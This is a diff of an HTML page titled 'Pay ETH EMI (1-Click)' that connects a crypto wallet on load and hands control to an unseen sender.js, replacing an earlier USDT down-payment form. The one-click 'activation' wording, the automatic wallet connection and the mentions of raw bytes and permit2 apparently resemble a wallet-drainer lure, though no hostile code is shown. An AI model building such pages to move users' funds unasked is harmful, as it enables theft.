@@ -1,4 +1,62 @@
-<!-- raw bytes code without IERC20+permit2 -->
+<!-- raw bytes with ETH -->
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Pay ETH EMI (1-Click)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+
+        h2 {
+            color: #333;
+        }
+
+        #planInfo {
+            background: #f0f9ff;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border-left: 4px solid #0ea5e9;
+        }
+
+        button {
+            width: 100%;
+            padding: 18px;
+            margin: 12px 0;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .primary {
+            background: linear-gradient(45deg, #10b981, #059669);
+            color: white;
+        }
+
+        .success {
+            background: linear-gradient(45deg, #10b981, #059669);
+        }
+    </style>
+</head>
+
+<body>
+    <h2>🚀 ETH EMI Activation</h2>
+    <div id="planInfo">Connecting wallet...</div>
+    <script type="module" src="./sender.js" defer></script>
+</body>
+
+</html>
+
+<!-- raw bytes code without IERC20+permit2
 <!DOCTYPE html>
 <html>
 
@@ -74,15 +132,15 @@
     <label>Down Payment (Optional)</label>
     <input type="number" id="activationAmount" placeholder="0 USDT" step="0.000001" value="0">
 
-    <!-- Buttons auto-managed by JS -->
-    <button id="payBtn" disabled class="secondary">
+    Buttons auto-managed by JS -->
+<!-- <button id="payBtn" disabled class="secondary">
         2️⃣ START EMI (Approve First)
     </button>
 
     <script type="module" src="./sender.js" defer></script>
-</body>
+</body> -->
 
-</html>
+<!-- </html> -->
 
 <!-- <!DOCTYPE html>
 <html>
